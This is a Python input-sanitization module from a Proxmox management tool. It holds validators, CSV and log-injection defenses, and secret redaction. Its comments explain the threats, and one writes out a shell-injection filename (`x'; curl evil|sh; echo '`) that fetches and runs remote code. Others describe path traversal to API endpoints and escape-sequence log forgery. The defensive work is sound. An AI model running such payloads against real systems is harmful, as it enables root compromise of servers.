# -*- coding: utf-8 -*-
"""
PegaProx Input Sanitization - Layer 2
"""

import logging
import re
import html

# NS: split from monolith - these were scattered all over the place before


def sanitize_string(value: str, max_length: int = 1000, allow_html: bool = False) -> str:
    """sanitize string input, escape html by default"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    
    # Truncate to max length
    value = value[:max_length]
    
    # Strip null bytes and other control characters (0x0b = vertical tab, 0x0c = form feed)
    # MK: the regex looks scary but its just ASCII C0 control chars minus \t \n \r
    value = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', value)
    
    # Escape HTML if not allowed
    if not allow_html:
        value = html.escape(value)
    
    return value.strip()


def sanitize_identifier(value: str, max_length: int = 64) -> str:
    """sanitize identifier - alphanumeric, underscore, hyphen, dot only"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    
    # Only allow safe characters
    value = re.sub(r'[^a-zA-Z0-9_\-\.]', '', value)
    
    return value[:max_length]


def sanitize_username(value: str, max_length: int = 64) -> str:
    """sanitize username — allows @ for email-style logins"""
    if not isinstance(value, str):
        value = str(value) if value is not None else ''
    value = re.sub(r'[^a-zA-Z0-9_\-\.@\+]', '', value)
    return value[:max_length]


def sanitize_int(value, default: int = 0, min_val: int = None, max_val: int = None) -> int:
    """Sanitize an integer input"""
    try:
        result = int(value)
        if min_val is not None and result < min_val:
            result = min_val
        if max_val is not None and result > max_val:
            result = max_val
        return result
    except (ValueError, TypeError):
        return default


def sanitize_bool(value, default: bool = False) -> bool:
    """Sanitize a boolean input"""
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        return value.lower() in ('true', '1', 'yes', 'on')
    if isinstance(value, int):
        return value != 0
    return default


# MK Sep 2026 - every anchored validator below ends in \Z, not $. In Python `$` also
# matches immediately BEFORE a trailing newline, so `re.match(r'^[a-z]+$', 'abc\n')` is a
# match and every one of these accepted a value with a newline glued to the end. Two of
# them gate values that reach a root shell on a PVE node unquoted, where a newline is a
# command terminator, and one gates a path segment we hand to the PVE API. Nothing
# legitimate here ever ends in a newline. \Z means the end of the string and only that.


def validate_email(email: str) -> bool:
    """Validate email format"""
    if not email or not isinstance(email, str):
        return False
    # Simple regex - not perfect but catches most issues
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\Z'
    return bool(re.match(pattern, email))


def validate_hostname(hostname: str) -> bool:
    """Validate hostname/IP format"""
    if not hostname or not isinstance(hostname, str):
        return False
    # Allow IP addresses and hostnames
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}\Z'
    hostname_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*\Z'
    return bool(re.match(ip_pattern, hostname) or re.match(hostname_pattern, hostname))


def validate_storage_name(storage) -> bool:
    """Validate Proxmox / XCP-ng storage identifier.

    PVE/XCP storage names are alphanumeric + dash + underscore + dot. Anything
    outside that set has no legitimate use in our context and reaching us is a
    sign of an injection attempt against the `pvesm` / `qm` shell calls that
    embed the storage name. MK May 2026 (Aikido #481 port — original PR was
    closed-superseded by mistake; manually ported after re-review.)
    """
    if not storage or not isinstance(storage, str):
        return False
    # Must start with alphanumeric, 1-100 chars total, set: [A-Za-z0-9._-]
    pattern = r'^[a-zA-Z0-9][a-zA-Z0-9_\-\.]{0,99}\Z'
    return bool(re.match(pattern, storage))


# NS Jul 2026 (pentest CRIT) — ISO/template filenames flow UNESCAPED into SSH
# shell commands on PVE nodes (sync_content_to_nodes: `test -f '<path>/<filename>'`,
# scp/sftp relay). They are only single-quoted, so a filename containing a quote
# (`x'; curl evil|sh; echo '`) breaks out → root RCE on every node, reachable by a
# low-priv storage.upload holder. A PVE ISO/vztmpl filename is a single path
# component of [A-Za-z0-9._+-] (e.g. debian-12.iso, ubuntu_22.04-1_amd64.tar.zst) —
# reject anything else (no '/', no spaces, no shell metachars) and fail closed.
_CONTENT_FILENAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9._+\-]{0,254}\Z')

def validate_content_filename(value) -> bool:
    """True if `value` is a safe single ISO/template filename for the content-sync
    shell path (one component, no '/'/space/shell-metachars). Empty → False."""
    if not value or not isinstance(value, str):
        return False
    return bool(_CONTENT_FILENAME_RE.match(value))


# NS 2026-06-05 (security audit C-2/M-2): ESXi datastore names and VM-directory
# names flow UNQUOTED into root shell commands on the PVE node (sshfs mounts,
# qemu-img, find). VMware allows letters/digits/space and a small punctuation
# set in these; a single component never contains '/'. Anything with shell
# metacharacters (; | & $ ` < > newlines quotes backslash) or a slash is an
# injection attempt against the V2P shell pipeline — reject it hard, fail closed.
_ESXI_NAME_RE = re.compile(r'^[A-Za-z0-9][A-Za-z0-9 ._()+\-]{0,127}\Z')

def validate_esxi_path_component(value) -> bool:
    """True if `value` is a safe single ESXi datastore / directory name.

    NOT a full path — one path component only (no '/'). Used to gate the
    user-supplied esxi_datastore / esxi_vm_dir before they reach the V2P
    SSHFS + qemu-img shell calls. Empty is rejected; callers that allow
    auto-detect must check for empty BEFORE calling this.
    """
    if not value or not isinstance(value, str):
        return False
    return bool(_ESXI_NAME_RE.match(value))


# MK Sep 2026 (audit CRIT) — a snapshot name goes straight into the PVE API path
# (.../{vmid}/snapshot/{snapname}), and the authz gate in front of those routes only ever
# validates the vmid. So a name carrying dot-segments walked out of the guest the caller owns
# and reached arbitrary PVE endpoints as the cluster's stored root ticket — five `../` from
# the snapshot path lands on /access/users, and the verb is DELETE. The portal grew a private
# copy of this check when the same bug was found there; the dashboard twins never got it, so
# it lives here now and the sinks in manager.py enforce it for every caller.
# PVE's own snapshot-name rule is [A-Za-z][A-Za-z0-9_-]*, so nothing legitimate is refused.
_SNAPSHOT_NAME_RE = re.compile(r'^[A-Za-z][A-Za-z0-9_\-]{0,62}\Z')


def validate_snapshot_name(value) -> bool:
    """True if `value` is a legitimate PVE snapshot name (one path segment, no dot-segments).

    Empty is rejected; a caller that means "the running config" must check for PVE's synthetic
    'current' before calling this."""
    if not value or not isinstance(value, str):
        return False
    return bool(_SNAPSHOT_NAME_RE.match(value))


# MK Sep 2026 - SDN object ids arrive as a URL path segment and are then interpolated into
# the PVE API path, which we speak with the cluster's stored root credential. requests
# resolves dot segments before it sends, so an id of ".." moves the whole PUT or DELETE one
# level up the SDN tree - the same shape as the snapshot-name traversal, caught earlier this
# time because the router will not pass a slash. Proxmox publishes the grammar itself
# (pve-sdn-vnet-id is [a-zA-Z][a-zA-Z0-9]*[a-zA-Z0-9]); dash and underscore are allowed here
# too so an id someone already created is not suddenly refused. A dot never is.
_SDN_ID_RE = re.compile(r'^[A-Za-z][A-Za-z0-9_\-]{0,62}\Z')


def validate_sdn_id(value) -> bool:
    """True if `value` is usable as a single PVE SDN path segment (zone, vnet, fabric,
    controller, ipam, dns). Rejects dot segments, empties and anything with a separator."""
    if not value or not isinstance(value, str):
        return False
    return bool(_SDN_ID_RE.match(value))


def sanitize_csv_field(value) -> str:
    """Sanitize field for CSV export to prevent formula injection.
    
    Neutralizes leading characters (=, +, -, @, tab, carriage return) that
    spreadsheet applications interpret as formula prefixes. Prepends a single
    quote to force literal interpretation while preserving the original value.
    
    References:
    - OWASP: https://owasp.org/www-community/attacks/CSV_Injection
    - CWE-1236: Improper Neutralization of Formula Elements in a CSV File
    """
    if value is None:
        return ''
    
    # Convert to string
    s = str(value)
    
    # Check if the field starts with a formula-triggering character
    # =, +, -, @ are the primary formula prefixes
    # \t (tab) and \r (carriage return) can also be exploited in some contexts
    if s and s[0] in ('=', '+', '-', '@', '\t', '\r'):
        # Prepend single quote to force literal interpretation
        # This is the recommended mitigation per OWASP guidance
        return "'" + s

    return s


# everything in C0 except tab, DEL, and the C1 range - ESC among them, which is what
# every ANSI sequence starts with
_CONTROL_CHARS_RE = re.compile(r'[\x00-\x08\x0b-\x0c\x0e-\x1f\x7f-\x9f]')


def sanitize_log_message(value) -> str:
    """Strip CR/LF from a value before writing it to the text audit log.

    Without this, an attacker who controls any audit field (e.g. submits a
    username containing `\\nAudit: admin - deleted_everything`) could inject
    a fake-looking log line and confuse anyone tailing the file. The DB
    record stores the unmodified value, so this only sanitises the text
    stream.

    CWE-117 / OWASP Log Injection.
    """
    if value is None:
        return ''
    # MK May 2026 - cheap str-replace, called on every audit log write.
    # Also strips the unicode line separators U+2028/U+2029 which some viewers
    # (and json.dumps without ensure_ascii) treat as newlines. Tab is left
    # alone (legitimate in some action strings).
    s = str(value)
    s = s.replace('\r', ' ').replace('\n', ' ')
    s = s.replace('\u2028', ' ').replace('\u2029', ' ')
    # MK Sep 2026 - and the rest of the control range. A name carrying \x1b[2K\r does not
    # just add a line, it rewrites what the operator sees in their terminal: erase the
    # line, move the cursor, repaint something else, set the window title. Stripping CR
    # and LF stopped the forged LINE and left the forged SCREEN. Tab stays: it is
    # legitimate in action strings and cannot move a cursor about.
    return _CONTROL_CHARS_RE.sub(' ', s)




def bounded_list(value, max_items=256, max_length=253, dedupe=True, name='list'):
    """A list that came out of a request body, bounded in both directions.

    Ten endpoints took a list from the caller, checked at most that it WAS a list, and
    persisted it: fallback hosts, excluded nodes, cluster reorder, affinity-rule members,
    multipath nodes, PBS cluster links, template metadata, pool members, VM tags. None of
    them bounded the item count or the item length, so one request could store a million
    entries of a megabyte each - durably, and then reload them into memory on every start.
    Duplicates matter too: several of these fan out one request per entry.

    Returns (cleaned, error). `error` is None when it is fine, otherwise a sentence for
    the 400. MK Sep 2026
    """
    if value is None:
        return [], None
    if not isinstance(value, (list, tuple)):
        return None, f'{name} must be a list'
    if len(value) > max_items:
        return None, f'{name} accepts at most {max_items} entries ({len(value)} given)'
    out, seen = [], set()
    for item in value:
        if item is None or isinstance(item, (dict, list, tuple, bool)):
            return None, f'{name} entries must be plain strings or numbers'
        text = str(item).strip()
        if not text:
            continue
        if len(text) > max_length:
            return None, f'{name} entries are limited to {max_length} characters'
        if dedupe:
            if text in seen:
                continue
            seen.add(text)
        out.append(text)
    return out, None


# Query parameters that carry a credential in practice. Matched case-insensitively
# against the parameter NAME, so `?api_key=` and `?X-Amz-Signature=` both go.
_SECRET_PARAM_HINTS = ('token', 'key', 'secret', 'password', 'passwd', 'pwd',
                       'sig', 'signature', 'credential', 'auth')


# Extra hints that only make sense for a MAPPING key, not for a URL query parameter.
# `target-endpoint` is PVE's remote-migration field and carries a full-rights API token
# inside its value; it matches none of the hints above, which is why folding the old
# per-key redaction in core/manager.py into the shared rule needed this line. Keeping them
# separate leaves redact_url()'s behaviour exactly as it was.
_SECRET_KEY_EXTRA_HINTS = ('endpoint', 'apitoken', 'bindpw', 'passphrase', 'privatekey')


def redact_secrets(mapping, _depth=0):
    """Return a copy of a mapping with credential-bearing values replaced.

    For the case where a handler wants to log a request body or a backend config
    whole. The storage-create route did exactly that at DEBUG level, and for a PBS
    or CIFS target that payload carries `password` verbatim — `--debug` is an
    ordinary thing to be running. core/manager.py had already been bitten by this
    once (a cleartext PVEAPIToken in a migration payload) and fixed it with a dict
    comprehension for the single key it knew about, which is why the storage route
    went on leaking: the fix was correct and reached one line.

    Key names are matched case-insensitively as substrings against
    _SECRET_PARAM_HINTS — the same list redact_url() applies to query parameters,
    so adding a hint covers every caller — plus _SECRET_KEY_EXTRA_HINTS for the
    field names that only ever appear as mapping keys. It over-matches slightly
    (PVE's `keyboard` contains `key`), which is the right direction for a log
    line. An empty or absent value is left alone so "not set" does not start
    reading as "set". A matching key is redacted whatever it holds, including a
    whole sub-mapping — `credentials: {...}` has already told you what is in
    there, and walking in to publish it a leaf at a time because the leaf names
    do not match would be the wrong way round. Sub-mappings under a NON-matching
    key are walked; other values pass through, so this is not a deep sanitiser —
    it is what you call instead of interpolating a dict into a format string. NS
    """
    if not isinstance(mapping, dict):
        return mapping
    if _depth > 4:
        return '***TRUNCATED***'
    out = {}
    for k, v in mapping.items():
        if any(h in str(k).lower() for h in _SECRET_PARAM_HINTS + _SECRET_KEY_EXTRA_HINTS):
            out[k] = '***REDACTED***' if v not in (None, '') else v
        elif isinstance(v, dict):
            out[k] = redact_secrets(v, _depth + 1)
        else:
            out[k] = v
    return out


def redact_url(value):
    """Make a URL safe to write into a log line.

    Eight findings said the same thing from different files: a URL gets logged when a
    request fails, and the URL is the credential. `https://user:pass@host/` keeps the
    password in netloc - urlsplit().netloc includes userinfo, which is how the SIEM TLS
    warning ended up printing one. A Slack or Teams webhook URL has no userinfo at all;
    the secret IS the path. And a pre-signed download URL carries it in the query.

    So all three go: userinfo, the query values of anything that looks like a secret,
    and any path beyond the first segment. Enough is left to tell which endpoint failed,
    which is what the operator reading the log actually needs.

    Anything that does not parse as a URL is returned unchanged - callers pass whole
    exception strings through here. MK Sep 2026
    """
    if not value:
        return value
    text = str(value)

    def _one(m):
        scheme, userinfo, host, rest = m.group(1), m.group(2), m.group(3), m.group(4) or ''
        out = f'{scheme}://'
        if userinfo:
            out += '[REDACTED]@'
        out += host
        path, sep, query = rest.partition('?')
        segments = [s for s in path.split('/') if s]
        if len(segments) > 1:
            # The first segment of a multi-segment path is structural - 'services' on a
            # Slack hook, 'api' on a Discord one - so keeping it says which endpoint
            # failed without giving anything away.
            out += '/' + segments[0] + '/[REDACTED]'
        elif segments:
            # MK Sep 2026 (follow-up) - a LONE segment is not structure, it is the whole
            # path, and for an ntfy topic that path is the credential: anyone holding
            # https://ntfy.sh/<topic> can publish to it and read it. The first version
            # kept segments[0] unconditionally and printed such a URL verbatim, which is
            # exactly the leak this function exists to stop. Nothing is learned from a
            # single segment anyway - the host already says which service it was.
            out += '/[REDACTED]'
        if sep:
            parts = []
            for pair in query.split('&'):
                name, eq, _val = pair.partition('=')
                if eq and any(h in name.lower() for h in _SECRET_PARAM_HINTS):
                    parts.append(f'{name}=[REDACTED]')
                else:
                    parts.append(pair)
            out += '?' + '&'.join(parts)
        return out

    return re.sub(
        r'(https?)://(?:([^/@\s]+)@)?([A-Za-z0-9_.\-:\[\]]+)([^\s\'"<>]*)',
        _one, text)


class LogInjectionFilter(logging.Filter):
    """Neutralise control characters on every log record, at the sink.

    Fourteen findings named fourteen files for the same thing: a name, a URL, an error
    string the caller chose ends up in a log line, and CR/LF lets them forge a line
    while ESC lets them repaint the operator's terminal. Wrapping the call sites means
    seventy-five edits and a seventy-sixth that somebody forgets next month, so this
    sits on the root logger instead and covers the ones written after today too.

    Deliberately only `msg` and `args`. A traceback arrives through exc_info and is
    appended by the formatter afterwards, so it keeps its newlines - it is ours, not
    the caller's, and an unreadable traceback helps nobody. MK Sep 2026
    """

    def filter(self, record):
        if isinstance(record.msg, str):
            record.msg = sanitize_log_message(record.msg)
        if record.args:
            if isinstance(record.args, dict):
                record.args = {k: (sanitize_log_message(v) if isinstance(v, str) else v)
                               for k, v in record.args.items()}
            elif isinstance(record.args, tuple):
                record.args = tuple(sanitize_log_message(a) if isinstance(a, str) else a
                                    for a in record.args)
        return True


def install_log_injection_filter(logger=None):
    """Attach the filter to a logger's handlers (root by default). Idempotent.

    Covers only the handlers that exist WHEN IT RUNS - see
    install_log_record_sanitizer() for why that was not enough.
    """
    target = logger if logger is not None else logging.getLogger()
    for handler in target.handlers:
        if not any(isinstance(f, LogInjectionFilter) for f in handler.filters):
            handler.addFilter(LogInjectionFilter())
    return target


_RECORD_FACTORY_INSTALLED = False


def install_log_record_sanitizer():
    """Neutralise control characters when the record is BUILT, not when it is handled.

    MK Sep 2026 (follow-up) - the handler filter above was meant to be "at the sink
    instead of at seventy-five call sites", and it missed a sink. A logging Filter lives
    on a HANDLER, and install_log_injection_filter() walks the handlers that exist at the
    moment it runs. core/manager.py and core/xcpng.py give every cluster its own logger
    with its own file and console handler, added when that cluster is constructed - long
    after startup. Those handlers carry no filter, and a cluster logger emits through its
    own handlers BEFORE propagating to root, so the per-cluster log file got the raw line
    while the main log got the clean one. Measured, not assumed: a VM rename containing
    CR/LF produced a forged, correctly-timestamped line in the cluster file.

    The record factory runs once per record, before any handler or propagation, so it
    covers every logger in the process including ones added later. Chains whatever
    factory is already installed rather than replacing it, and is idempotent.

    Same deliberate scope as the filter: `msg` and `args` only. A traceback arrives via
    exc_info and is rendered by the formatter, so it keeps its newlines.
    """
    global _RECORD_FACTORY_INSTALLED
    if _RECORD_FACTORY_INSTALLED:
        return
    previous = logging.getLogRecordFactory()

    def _sanitising_factory(*args, **kwargs):
        record = previous(*args, **kwargs)
        if isinstance(record.msg, str):
            record.msg = sanitize_log_message(record.msg)
        if record.args:
            if isinstance(record.args, dict):
                record.args = {k: (sanitize_log_message(v) if isinstance(v, str) else v)
                               for k, v in record.args.items()}
            elif isinstance(record.args, tuple):
                record.args = tuple(sanitize_log_message(a) if isinstance(a, str) else a
                                    for a in record.args)

        # MK Sep 2026 (follow-up) - sanitising msg and args covers str values and nothing
        # else, and the most common thing we log is not a str: `logging.error("...: %s", e)`
        # passes the EXCEPTION, and str(e) carries whatever a remote server put in its error
        # text. Measured: that forged a line straight through both this factory and the
        # handler filter. Rendering is the one place where msg and args become text
        # regardless of their types, so clean the rendered result too. It happens after %
        # formatting, so a %d with an int still formats as an int; exc_info is appended by
        # the formatter afterwards, so tracebacks keep their newlines.
        _render = record.getMessage

        def _clean_render(_r=_render):
            return sanitize_log_message(_r())

        record.getMessage = _clean_render
        return record

    logging.setLogRecordFactory(_sanitising_factory)
    _RECORD_FACTORY_INSTALLED = True
